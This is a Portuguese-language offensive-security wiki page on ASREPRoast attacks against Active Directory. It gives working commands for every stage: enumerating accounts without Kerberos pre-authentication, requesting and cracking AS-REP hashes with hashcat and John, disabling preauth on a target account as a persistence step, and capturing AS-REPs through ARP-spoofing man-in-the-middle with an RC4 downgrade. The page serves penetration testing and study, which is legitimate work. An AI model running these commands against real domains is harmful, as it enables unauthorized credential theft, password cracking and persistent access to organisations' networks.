# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast é um ataque de segurança que explora usuários que não possuem o atributo **Kerberos pre-authentication required**. Essencialmente, essa vulnerabilidade permite que attackers solicitem a autenticação de um usuário ao Domain Controller (DC) sem precisar da senha do usuário. O DC então responde com uma mensagem criptografada com a chave derivada da senha do usuário, que os attackers podem tentar crackear offline para descobrir a senha do usuário.

Os principais requisitos para esse ataque são:

- **Ausência de Kerberos pre-authentication**: os usuários-alvo não devem ter esse recurso de segurança habilitado.
- **Conexão com o Domain Controller (DC)**: os attackers precisam de acesso ao DC para enviar solicitações e receber mensagens criptografadas.
- **Conta de domínio opcional**: ter uma conta de domínio permite que os attackers identifiquem usuários vulneráveis com mais eficiência por meio de consultas LDAP. Sem essa conta, os attackers precisam adivinhar os nomes de usuário.

#### Enumerando usuários vulneráveis (são necessárias credenciais de domínio)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Solicitar mensagem AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus solicita **RC4** por padrão, portanto o Event ID **4768** geralmente mostra **preauth type 0** e **ticket encryption type 0x17**. Se você adicionar **`/aes`** (ou se RC4 estiver desabilitado para o alvo), espere **AES etypes** em vez disso.<sup>[[2]](#references)</sup>

#### One-liners rápidos (Linux)

- Enumere primeiro os alvos em potencial (por exemplo, a partir de build paths vazados) com Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Faça AS-REP roast de uma lista completa de usernames sem creds válidas usando NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Se você tiver creds, deixe o NetExec consultar o LDAP e solicitar todas as contas vulneráveis a roast: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Se a saída começar com **`$krb5asrep$23$`**, faça crack com o Hashcat usando **`-m 18200`**. Se começar com **`$krb5asrep$17$`** ou **`$krb5asrep$18$`**, prefira o John com **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Não presuma que todo AS-REP roast usa RC4. Ferramentas modernas podem retornar **RC4** (`$krb5asrep$23$`) ou **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), dependendo do enctype solicitado/negociado. **`hashcat -m 18200`** é para **etype 23**, enquanto o **John** lida diretamente com `krb5asrep` para **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistência

Force **preauth** não é necessário para um usuário sobre o qual você tenha permissões **GenericAll** (ou permissões para gravar propriedades):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast sem credenciais

Um atacante pode usar uma posição de man-in-the-middle para capturar pacotes AS-REP enquanto eles trafegam pela rede, sem depender de a pre-authentication do Kerberos estar desabilitada. Portanto, funciona para todos os usuários na VLAN.\
Se você quiser o truque relacionado sem credenciais que retorna um **service ticket** em vez de um **TGT** de um principal sem pre-auth, consulte [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) permite fazer isso. O modo `relay` é o mais interessante ofensivamente, pois pode forçar **RC4** quando o cliente ainda anuncia **etype 23**; `listen` permanece passivo e apenas captura o que quer que o cliente/DC tenha negociado.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referências

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
